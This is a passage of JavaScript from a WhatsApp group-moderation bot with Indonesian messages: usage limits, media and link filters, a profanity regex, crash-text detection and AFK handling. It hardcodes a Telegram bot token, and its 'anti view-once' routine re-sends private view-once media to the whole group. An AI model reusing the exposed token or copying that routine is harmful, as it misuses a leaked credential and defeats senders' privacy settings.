        data = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=${encodeURIComponent(packName)}`, {method: "GET",headers: {"User-Agent": "GoogleBot"}})
        const xeonyresult = []
        for (let i = 0; i < data.data.result.stickers.length; i++) {
            fileId = data.data.result.stickers[i].thumb.file_id
            data2 = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=${fileId}`)
            result = {
            status: 200,
            author: 'DGXeon',
            url: "https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/" + data2.data.result.file_path
            }
            xeonyresult.push(result)
        }
    resolve(xeonyresult)
    })
}
        
        //limit func
        async function useLimit(senuseLimitder, amount) {
            db.data.users[sender].limit -= amount
            db.data.users[sender].totalLimit += amount
            replygcxeon(`You have used up: ${amount} limit\nRemaining: ${db.data.users[sender].limit} limit`)
        }
        async function resetLimit() {
            let users = Object.keys(global.db.data.users)
            let Limitxeon = isPremium ? limit.prem : limit.free
            for (let i of users) {
               db.data.users[i].limit = Limitxeon
            }
            XeonBotInc.sendText('120363167338947238@g.us', { text: `Reset Limit`})
        }
        // Grup Only
        if (!m.isGroup && !XeonTheCreator && db.data.settings[botNumber].onlygrub ) {
        	if (isCommand){
            return replygcxeon(`*Hai cuy.... untuk meminimalisir spam kepada bot nya, silahkan gunakan bot ini didalam grup saja ya....* !\n\nkalo lu ada masalah atau semisalnya silahkan chat ke admin ya... wa.me/${ownernumber}`)
            }
        }
        // Private Only
        if (!XeonTheCreator && db.data.settings[botNumber].onlypc && m.isGroup) {
        	if (isCommand){
	         return replygcxeon("*hay cuyy....kalo mau pake bot nya .. silahkan via chat pribadi ya..jangan di grup..biar yang lain nya gak terganggu*")
	     }
	}
	     
        if (!XeonBotInc.public) {
            if (XeonTheCreator && !m.key.fromMe) return
        }
        if (db.data.settings[botNumber].online) {
        	if (isCommand) {
        	XeonBotInc.sendPresenceUpdate('unavailable', from)
        }
        }
        if (db.data.settings[botNumber].autoread) {
            XeonBotInc.readMessages([m.key])
        }
        //auto set bio\\
	if (db.data.settings[botNumber].autobio) {
            XeonBotInc.updateProfileStatus(`${botname} Have Been Running For ${runtime(process.uptime())}`).catch(_ => _)
        }
     //auto type record
        if (db.data.settings[botNumber].autorecordtype){
        if (isCommand) {
            let xeonmix = ['composing', 'recording']
            xeonmix2 = xeonmix[Math.floor(xeonmix.length * Math.random())]
            XeonBotInc.sendPresenceUpdate(xeonmix2, from)
        }
        }
        if (db.data.settings[botNumber].autorecord){
        if (isCommand) {
        	let xeonmix = ['recording']
            xeonmix2 = xeonmix[Math.floor(xeonmix.length * Math.random())]
            XeonBotInc.sendPresenceUpdate(xeonmix2, from)
        }
        }
        if (db.data.settings[botNumber].autotype){
        if (isCommand) {
        	let xeonpos = ['composing']
            XeonBotInc.sendPresenceUpdate(xeonpos, from)
        }
        }
        
        //auto block number
        if (m.sender.startsWith(`${autoblocknumber}`) && db.data.settings[botNumber].autoblocknum === true) {
            return XeonBotInc.updateBlockStatus(m.sender, 'block')
        }
        if (!m.sender.startsWith('91') && db.data.settings[botNumber].onlyindia === true) {
            return XeonBotInc.updateBlockStatus(m.sender, 'block')
        }
        if (!m.sender.startsWith('62') && db.data.settings[botNumber].onlyindo === true) {
            return XeonBotInc.updateBlockStatus(m.sender, 'block')
        } 
        if (!m.sender.startsWith(`${antiforeignnumber}`) && db.data.chats[m.chat].antiforeignnum === true){ 
        	if (XeonTheCreator || isAdmins || !isBotAdmins) return
            XeonBotInc.sendMessage(m.chat, { text: `Sorry buddy! you will be removed because the group admin/owner has enabled anti foreign number, only +${antiforeignnumber} country code is allowed to join the group` }, {quoted: m})
            await sleep(2000)
            await XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
        let list = []
for (let i of owner) {
list.push({
	    	displayName: await XeonBotInc.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await XeonBotInc.getName(i)}\nFN:${await XeonBotInc.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}
        //console log
        if (isCommand) {
            console.log(color(`\n< ================================================== >\n`, 'cyan'))
            console.log(chalk.black(chalk.bgWhite(!isCommand ? '[ MESSAGE ]' : '[ COMMAND ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
            global.db.data.settings[botNumber].totalhit += 1
        }
        
        // Anti View Once (versi stabil)
if (
  db.data.chats[m.chat]?.antiviewonce &&
  m.isGroup &&
  (m.message?.viewOnceMessage || m.message?.viewOnceMessageV2)
) {
  if (m.isBaileys && m.fromMe) return

  const viewOnceObj = m.message.viewOnceMessage || m.message.viewOnceMessageV2
  const originalMsg = viewOnceObj.message
  const msgType = Object.keys(originalMsg || {})[0]

  if (!originalMsg || !msgType) return

  // Hapus properti viewOnce agar bisa diforward
  if (originalMsg[msgType]?.viewOnce) delete originalMsg[msgType].viewOnce

  await XeonBotInc.sendMessage(
    m.chat,
    { forward: { key: m.key, message: originalMsg, ...m } },
    { quoted: m }
  )

  console.log(`[AntiViewOnce] Pesan view-once dari ${m.sender} dibuka dan dikirim ulang.`)
}
        //ANTI VIRUS
if (isGroup && db.data.chats[m.chat].antivirtex) {
if (budy.includes('๒๒๒๒') || budy.includes('ดุ') || budy.includes('ผิดุท้เึางืผิดุท้เึางื') || budy.includes('๑๑๑๑๑๑๑๑') || budy.includes('৭৭৭৭৭৭৭৭') || budy.includes('   ⃢   ⃢   ⃢  ') || budy.includes('*⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟') || budy.includes('ผดิทุเ้ึางผืดิทุเ้') || budy.includes('.*࡞ࣰࣰࣰࣲࣲࣲࣲࣩࣩࣩࣩࣶࣶ࣯࣯࣮࣮ࣦ࣯ࣨࣨࣨࣻࣻࣻࣼࣼࣼࣽࣽࣾࣷࣵࣴ࣬࣬࣬ࣤࣤࣧࣧ*') || budy.includes('᥋') || budy.includes('؁') || budy.includes('ٯٯٯٯٯ') ) {
if (isGroupAdmins) return replygcxeon('*VIRTEX DETECTED*')
console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
XeonBotInc.sendText(m.chat, `*MARK AS READ*\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n *Virus sender here👇:* \nwa.me/${sender.split("@")[0]}`)   
if (!isBotAdmins) return
if(XeonTheCreator) return
XeonBotInc.groupParticipantsUpdate(from, [sender], 'remove')
await XeonBotInc.sendMessage(from, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
XeonBotInc.sendMessage(`${ownernumber}@s.whatsapp.net`,{text: `Hi Owner! wa.me/${sender.split("@")[0]} Detected Having Sent Virtex ${isGroup?`in ${groupName}`:''}`})
 }
 }
 
 if (db.data.chats[m.chat].antibot) {
    if (m.isBaileys && m.fromMe == false){
        if (isAdmin || !isBotAdmin){		  
        } else {
          replygcxeon(`*ADA BOT LAIN DI GRUP INI*\n\nSILAHKAN KELUAR DARI GRUP.. KARENA GRUP INI TIDAK MENGIJINKAN BOT!!!`)
    return await XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
    }
   }
 
        //anti media
        if (db.data.chats[m.chat].antimedia && isMedia) {
        if (XeonTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygcxeon(`\`\`\`「 Media Detected 」\`\`\`\n\nMaaf , admin akan menghapus file yang kamu kirim... karena admin telah mengaktifkan antimedia di grup ini`)
    return XeonBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
  }
        if (db.data.chats[m.chat].image && isXeonMedia) {
    if(isXeonMedia === "imageMessage"){
        if (XeonTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygcxeon(`\`\`\`「 Image Detected 」\`\`\`\n\nMaaf, admin sudah menghidupkan anti-gambar di grup ini...jadi foto yang kamu kirim akan dihapus`)
    return XeonBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }

// Deteksi jenis media
const messageType = Object.keys(m.message || {})[0]

// Anti Media Umum
if (db.data.chats[m.chat].antimedia && isMedia) {
    if (!(XeonTheCreator || isAdmins || !isBotAdmins)) {
        replygcxeon(`\`\`\` Media Detected \`\`\`\n\nMaaf, file kamu telah dihapus karena admin mengaktifkan *Anti-Media* di grup ini.`)
        return XeonBotInc.sendMessage(m.chat, {
            delete: {
                remoteJid: m.chat,
                fromMe: false,
                id: m.key.id,
                participant: m.key.participant
            }
        })
    }
}

// Anti Gambar
if (db.data.chats[m.chat].image && isXeonMedia === "imageMessage") {
    if (!(XeonTheCreator || isAdmins || !isBotAdmins)) {
        replygcxeon(`\`\`\` Image Detected \`\`\`\n\nMaaf, gambar yang kamu kirim akan dihapus karena admin mengaktifkan *Anti-Gambar*.`)
        return XeonBotInc.sendMessage(m.chat, {
            delete: {
                remoteJid: m.chat,
                fromMe: false,
                id: m.key.id,
                participant: m.key.participant
            }
        })
    }
}

// Anti Sticker
if (db.data.chats[m.chat].antisticker && isXeonMedia === "stickerMessage") {
    if (!(XeonTheCreator || isAdmins || !isBotAdmins)) {
        replygcxeon(`\`\`\` Sticker Detected \`\`\`\n\nMaaf, sticker kamu dihapus karena *Anti-Sticker* aktif.`)
        return XeonBotInc.sendMessage(m.chat, {
            delete: {
                remoteJid: m.chat,
                fromMe: false,
                id: m.key.id,
                participant: m.key.participant
            }
        })
    }
}

// Anti Audio
if (db.data.chats[m.chat].antiaudio && isXeonMedia === "audioMessage") {
    if (!(XeonTheCreator || isAdmins || !isBotAdmins)) {
        replygcxeon(`\`\`\` Audio Detected \`\`\`\n\nMaaf, audio kamu akan dihapus karena *Anti-Audio* aktif.`)
        return XeonBotInc.sendMessage(m.chat, {
            delete: {
                remoteJid: m.chat,
                fromMe: false,
                id: m.key.id,
                participant: m.key.participant
            }
        })
    }
}

// === ANTI VIDEO (DENGAN SISTEM PERINGATAN) ===
if (db.data.chats[m.chat].antivideo && messageType === "videoMessage") {
    if (!(XeonTheCreator || isAdmins || !isBotAdmins)) {
        const userKey = `${m.chat}:${m.sender}`
        let warningCount = global.antiVideoWarnings.get(userKey) || 0
        warningCount++
        global.antiVideoWarnings.set(userKey, warningCount)

        // Hapus videonya
        await XeonBotInc.sendMessage(m.chat, {
            delete: {
                remoteJid: m.chat,
                fromMe: false,
                id: m.key.id,
                participant: m.key.participant
            }
        })

        if (warningCount === 1) {
            return XeonBotInc.sendMessage(m.chat, {
                text: `@${m.sender.split("@")[0]} *TELAH MENGIRIM VIDEO*\n\n*Peringatan 1:* Dilarang kirim video di grup ini!`,
                mentions: [m.sender]
            }, { quoted: m })
        }

        if (warningCount === 2) {
            return XeonBotInc.sendMessage(m.chat, {
                text: `@${m.sender.split("@")[0]} *MENGIRIM VIDEO LAGI*\n\n*Peringatan 2:* Awas, kalau kirim lagi kamu akan dikeluarkan!`,
                mentions: [m.sender]
            }, { quoted: m })
        }

        if (warningCount >= 3) {
            await XeonBotInc.sendMessage(m.chat, {
                text: `@${m.sender.split("@")[0]} *DIKELUARKAN DARI GRUP*\n\nKarena melanggar aturan anti-video sebanyak 3 kali.`,
                mentions: [m.sender]
            }, { quoted: m })

            await XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
            global.antiVideoWarnings.delete(userKey)
        }
    }
}
        if (db.data.chats[m.chat].antiaudio && isXeonMedia) {
    if(isXeonMedia === "audioMessage"){
        if (XeonTheCreator || isAdmins || !isBotAdmins){		  
        } else {
          replygcxeon(`\`\`\`「 Audio Detected 」\`\`\`\n\nMaaf, admin sudah menghidupkan anti-audio di grup ini...jadi audio yang kamu kirim akan dihapus`)
    return XeonBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
// Anti Polling yang dioptimalkan
if (m.isGroup && db.data.chats[m.chat]?.antipoll && isXeonMedia === "pollCreationMessageV3") {
    // Batasi log hanya saat level debug
    if (process.env.DEBUG === 'true') console.log("[ANTI-POLL] Polling Detected from:", m.sender);

    // Admin / creator / bot non-admin bypass
    if (XeonTheCreator || isAdmins || !isBotAdmins) return;

    // Inisialisasi warning jika belum ada
    if (!db.data.users[m.sender].warningPoll) db.data.users[m.sender].warningPoll = 0;
    db.data.users[m.sender].warningPoll += 1;
    const warning = db.data.users[m.sender].warningPoll;

    // Hapus pesan polling
    try {
        await XeonBotInc.sendMessage(m.chat, {
            delete: {
                remoteJid: m.chat,
                fromMe: false,
                id: m.key.id,
                participant: m.key.participant
            }
        });
    } catch (err) {
        if (process.env.DEBUG === 'true') console.error("[ANTI-POLL] Gagal hapus polling:", err);
    }

    // Tindak lanjut peringatan
    let warningText = `@${m.sender.split("@")[0]} *TERDETEKSI MENGIRIM POLLING*\n\n`;
    if (warning === 1) {
        warningText += `*Peringatan Pertama (1/3)*\nDilarang membuat polling di grup ini.`;
    } else if (warning === 2) {
        warningText += `*Peringatan Kedua (2/3)*\nJika kamu masih membuat polling, kamu akan dikick.`;
    } else if (warning >= 3) {
        try {
            await XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
            db.data.users[m.sender].warningPoll = 0;
            return XeonBotInc.sendMessage(m.chat, {
                text: `@${m.sender.split("@")[0]} telah dikick karena membuat polling 3 kali.`,
                contextInfo: { mentionedJid: [m.sender] }
            }, { quoted: m });
        } catch (err) {
            if (process.env.DEBUG === 'true') console.error("[ANTI-POLL] Gagal kick member:", err);
            return XeonBotInc.sendMessage(m.chat, {
                text: `@${m.sender.split("@")[0]} seharusnya dikick tapi gagal. Pastikan bot admin.`,
                contextInfo: { mentionedJid: [m.sender] }
            }, { quoted: m });
        }
    }

    // Kirim warning bertahap
    return XeonBotInc.sendMessage(m.chat, {
        text: warningText,
        contextInfo: { mentionedJid: [m.sender] }
    }, { quoted: m });
}
       // Anti-dokumen (documentMessage)
if (m.isGroup && db.data.chats[m.chat].antidocument && isXeonMedia === "documentMessage") {
    if (isAdmins || m.key.fromMe || XeonTheCreator) {
        return replygcxeon(' *DOKUMEN TERDETEKSI* \n\nAdmin bebas mengirim dokumen.')
    }

    db.data.users[m.sender].warningDocument = (db.data.users[m.sender].warningDocument || 0) + 1
    let warning = db.data.users[m.sender].warningDocument

    await XeonBotInc.sendMessage(m.chat, {
        delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant
        }
    })

    if (warning >= 3) {
        try {
            await XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
            db.data.users[m.sender].warningDocument = 0
            return XeonBotInc.sendMessage(m.chat, {
                text: `@${m.sender.split("@")[0]} *telah mengirim dokumen 3 kali dan telah dikick dari grup.*

*TOLONG BUAT YANG LAIN JANGAN MENGIRIM DOKUMEN DI GRUP INI*
*SEBELUM DIKICK OLEH ADMIN!*`,
                contextInfo: { mentionedJid: [m.sender] }
            }, { quoted: m })
        } catch (e) {
            console.error(`Gagal kick member: ${e}`)
            return XeonBotInc.sendMessage(m.chat, {
                text: `@${m.sender.split("@")[0]} seharusnya dikick, tapi bot bukan admin atau terjadi error.`,
                contextInfo: { mentionedJid: [m.sender] }
            }, { quoted: m })
        }
    } else {
        return XeonBotInc.sendMessage(m.chat, {
            text: `@${m.sender.split("@")[0]} *telah mengirimkan dokumen.*  

Ini adalah peringatan ke-${warning}/3. 
*HENTIKAN HAL TERSEBUT KARENA*
*Setelah 3 kali, kamu akan dikick.*`,
            contextInfo: { mentionedJid: [m.sender] }
        }, { quoted: m })
    }
}
      // Anti-kontak (contactMessage)
if (m.isGroup && db.data.chats[m.chat].anticontact && isXeonMedia === "contactMessage") {
    if (isAdmins || m.key.fromMe || XeonTheCreator) {
        return replygcxeon(' *KONTAK TERDETEKSI* \n\nAdmin bebas mengirim kontak.')
    }

    db.data.users[m.sender].warningContact = (db.data.users[m.sender].warningContact || 0) + 1
    let warning = db.data.users[m.sender].warningContact

    await XeonBotInc.sendMessage(m.chat, {
        delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant
        }
    })

    if (warning >= 3) {
        try {
            await XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
            db.data.users[m.sender].warningContact = 0
            return XeonBotInc.sendMessage(m.chat, {
                text: `@${m.sender.split("@")[0]} *telah mengirim kontak 3 kali dan telah dikick dari grup.*

*TOLONG BUAT YANG LAIN JANGAN MENGIRIM KONTAK DI GRUP INI*
*SEBELUM DIKICK OLEH ADMIN!*`,
                contextInfo: { mentionedJid: [m.sender] }
            }, { quoted: m })
        } catch (e) {
            console.error(`Gagal kick member: ${e}`)
            return XeonBotInc.sendMessage(m.chat, {
                text: `@${m.sender.split("@")[0]} seharusnya dikick, tapi bot bukan admin atau terjadi error.`,
                contextInfo: { mentionedJid: [m.sender] }
            }, { quoted: m })
        }
    } else {
        return XeonBotInc.sendMessage(m.chat, {
            text: `@${m.sender.split("@")[0]} *telah mengirimkan kontak.*  

Ini adalah peringatan ke-${warning}/3. 
*HENTIKAN HAL TERSEBUT KARENA*
*Setelah 3 kali, kamu akan dikick.*`,
            contextInfo: { mentionedJid: [m.sender] }
        }, { quoted: m })
    }
}
        //respond
        // badword detector (lebih akurat dengan regex)
if (db.data.chats[m.chat].badword) {
   const badwordRegex = new RegExp([
      
  // Bahasa Indonesia
  '\\b[a@]n[jg][i1!|]ng\\b', '\\bb[a@]j[i1!|]n?g[a4]n\\b', '\\b[gq]obl[o0]k\\b',
  '\\bkont[o0]l\\b', '\\bm[e3]m[e3]k\\b', '\\bpepek\\b', '\\bp[e3]l[e3]r\\b',
  '\\bt[i1]t[i1]d\\b', '\\bt[i1]t[i1]t\\b', '\\bb[a4]n[gq]s[a4]t\\b', '\\bs[e3]t[a4]n\\b',
  '\\bngent[o0][t7]\\b', '\\bc[u*]k\\b', '\\bs[a@]mp[a@]h\\b', '\\bb[e3]d[e3]b[a@]h\\b',
  '\\bkampret\\b', '\\blont[e3]\\b', '\\bsampah\\b', '\\bbabi\\b', '\\bta[iy]\\b',
  '\\bsial[a4]n?\\b', '\\bkepar[a4]t\\b', '\\bt[a4]ik\\b',

  // Bahasa Inggris
  '\\bf[u*]+[c|k]+\\b', '\\bsh[i1!]t\\b', '\\bass(h[o0]le)?\\b', '\\bb[i1!]tch\\b',
  '\\bd[i1!]ck\\b', '\\bpuss[y1!]\\b', '\\bc[u*]nt\\b', '\\bm[o0]therf[u*]+[c|k]+er\\b',
  '\\bwh[o0]re\\b', '\\bs[l1!]ut\\b', '\\bjerk\\b', '\\bd[a@]mn\\b',

  // Bahasa Jawa
  '\\bjanc[o0]k\\b', '\\bj[a@]nc[o0]kke?\\b', '\\bndasmu\\b', '\\bcok\\b', '\\bcokmu\\b',
  '\\bcokne\\b', '\\bketh[e3]k\\b', '\\blont[e3]\\b', '\\bbrengsek\\b', '\\bkeparat\\b',

  // Bahasa Sunda
  '\\bkehed\\b', '\\bgoblog\\b', '\\bsieun\\b', '\\bajig\\b', '\\bsu\\s*ud\\b',
  '\\bsue\\b', '\\bajg\\b', '\\bkeparat\\b',

  // Bahasa Batak
  '\\bsontoloyo\\b', '\\banjing\\b', '\\bsipat\\b', '\\btarsok\\b', '\\bbodat\\b',
  '\\bbangke\\b', '\\btolong\\s*aja\\b', '\\bparibanmu\\b', '\\bbego\\b',

  // Bahasa Madura
  '\\bp[a@]k[e3]n\\b', '\\bbuj[kck]uk\\b', '\\bcolok\\b', '\\btoket\\b', '\\btele\\b',
  '\\bset[a4]n\\b', '\\bgobres\\b', '\\bnyet\\b',

  // Campuran tambahan kasar
  '\\bpler\\b', '\\btetek\\b', '\\bpantat\\b', '\\bpeler\\b', '\\bdubur\\b', '\\bbutt\\b',
  '\\banjingan\\b', '\\bgoblokan\\b'

   ].join('|'), 'i')

   if (badwordRegex.test(budy)) {
      db.data.users[sender].warning = db.data.users[sender].warning || 0
      db.data.users[sender].warning++

      // Hapus chat
      await XeonBotInc.sendMessage(m.chat, {
         delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant
         }
      })

      if (db.data.users[sender].warning >= 3) {
         await XeonBotInc.groupParticipantsUpdate(m.chat, [sender], 'remove')
      } else {
         await XeonBotInc.sendMessage(m.chat, {
            text: `\`\`\` Peringatan ${db.data.users[sender].warning}/3 \`\`\`\n\n@${m.sender.split("@")[0]} *berkata kasar. Chat kamu dihapus.*

 *Tolong jangan ulangi hal tersebut*
*KARENA ADMIN AKAN MENGELUARKAN MU DARI GRUP*
*APABILA PERINGATAN INI TIDAK KAMU PATUHI*

*kalau kamu terkena peringatan sebanyak 3 kali berturut-turut, maka kamu akan terkena kick otomatis dari admin`,
            contextInfo: { mentionedJid: [m.sender] }
         }, { quoted: m })
      }
   }
}
        //autosticker
// Inisialisasi data user
if (!db.data.users[m.sender]) {
    db.data.users[m.sender] = {
        warning: 0,
        warningLink: 0
    }
}
if (typeof db.data.users[m.sender].warningLink !== 'number') db.data.users[m.sender].warningLink = 0

// Anti-link grup WhatsApp
if (m.isGroup && db.data.chats[m.chat].antilinkgc && budy.match(/chat\.whatsapp\.com/gi)) {
    if (isAdmins || m.key.fromMe || XeonTheCreator) {
        return replygcxeon(' *GC LINK DETECTED* \n\nAdmin bebas mengirim link grup.')
    }

    db.data.users[m.sender].warningLink += 1
    let warning = db.data.users[m.sender].warningLink

    await XeonBotInc.sendMessage(m.chat, {
        delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant
        }
    })

    if (warning >= 3) {
        try {
            await XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
            db.data.users[m.sender].warningLink = 0
            return XeonBotInc.sendMessage(m.chat, {
                text: `@${m.sender.split("@")[0]} *telah mengirim link 3 kali dan telah dikick dari grup.*

*TOLONG BUAT YANG LAIN JANGAN MENGIRIMKAN LINK DI GRUP INI*
*SEBELUM KALIAN DI KICK OLEH ADMIN*`,
                contextInfo: { mentionedJid: [m.sender] }
            }, { quoted: m })
        } catch (e) {
            console.error(`Gagal kick member: ${e}`)
            return XeonBotInc.sendMessage(m.chat, {
                text: `@${m.sender.split("@")[0]} seharusnya dikick, tapi bot bukan admin atau terjadi error.`,
                contextInfo: { mentionedJid: [m.sender] }
            }, { quoted: m })
        }
    } else {
        return XeonBotInc.sendMessage(m.chat, {
            text: `@${m.sender.split("@")[0]} *telah mengirimkan link grup.*  

Ini adalah peringatan ke-${warning}/3. 
*HENTIKAN HAL TERSEBUT KARENA*
*Setelah 3 kali, kamu akan dikick.*`,
            contextInfo: { mentionedJid: [m.sender] }
        }, { quoted: m })
    }
}

// Anti-link umum (http/https)
if (m.isGroup && db.data.chats[m.chat].antilink && budy.match(/https?:\/\//gi)) {
    if (isAdmins || m.key.fromMe || XeonTheCreator) {
        return replygcxeon(' *LINK TERDETEKSI* \n\nAdmin bebas mengirim link.')
    }

    db.data.users[m.sender].warningLink += 1
    let warning = db.data.users[m.sender].warningLink

    await XeonBotInc.sendMessage(m.chat, {
        delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant
        }
    })

    if (warning >= 3) {
        try {
            await XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
            db.data.users[m.sender].warningLink = 0
            return XeonBotInc.sendMessage(m.chat, {
                text: `@${m.sender.split("@")[0]} *telah mengirim link 3 kali dan telah dikick dari grup.*

*TOLONG BUAT YANG LAIN JANGAN MENGIRIMKAN LINK DI GRUP INI*
*SEBELUM KALIAN DI KICK OLEH ADMIN*`,
                contextInfo: { mentionedJid: [m.sender] }
            }, { quoted: m })
        } catch (e) {
            console.error(`Gagal kick member: ${e}`)
            return XeonBotInc.sendMessage(m.chat, {
                text: `@${m.sender.split("@")[0]} seharusnya dikick, tapi bot bukan admin atau terjadi error.`,
                contextInfo: { mentionedJid: [m.sender] }
            }, { quoted: m })
        }
    } else {
        return XeonBotInc.sendMessage(m.chat, {
            text: `@${m.sender.split("@")[0]} *telah mengirimkan link*  

Ini adalah peringatan ke-${warning}/3. 
*HENTIKAN HAL TERSEBUT KARENA*
*Setelah 3 kali, kamu akan dikick.*`,
            contextInfo: { mentionedJid: [m.sender] }
        }, { quoted: m })
    }
}
// Pengecekan mention user untuk AFK
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])];

for (let jid of mentionUser) {
    let user = db.data.users[jid];
    if (!user || user.afkTime === undefined || user.afkTime < 0) continue;  // Pastikan afkTime valid
    let afkTime = user.afkTime;
    let reason = user.afkReason || '';
    let duration = clockString(new Date().getTime() - afkTime);  // Hitung durasi AFK dengan benar
    replygcxeon(`*TOLONG JANGAN TAG DIA*\n *DIA AFK* ${reason ? '*KARENA* ' + reason : '*TANPA ALASAN*'}\n*AFK SEJAK :* ${duration}`);
}

// Pengecekan kembali dari AFK hanya untuk user premium yang kirim pesan
if (db.data.users[m.sender].afkTime > -1 && isPremium && m.message && !m.key.fromMe) {
    let user = db.data.users[m.sender];
    let duration = clockString(new Date().getTime() - user.afkTime);  // Hitung durasi AFK dengan benar
    replygcxeon(`*KAMU TELAH KEMBALI DARI AFK*\n*ALASAN AFK KARENA:* ${user.afkReason ? user.afkReason : ''}\n*DURASI AFK:* ${duration}`);
    
    // Reset waktu dan alasan AFK setelah user kembali
    user.afkTime = -1;
    user.afkReason = '';
}
        
//total features
const xeonfeature = () =>{
            var mytext = fs.readFileSync("./XeonCheems10.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length
            return numUpper
        }
        //autoreply
let input = budy.toLowerCase().trim()

// Voice Note
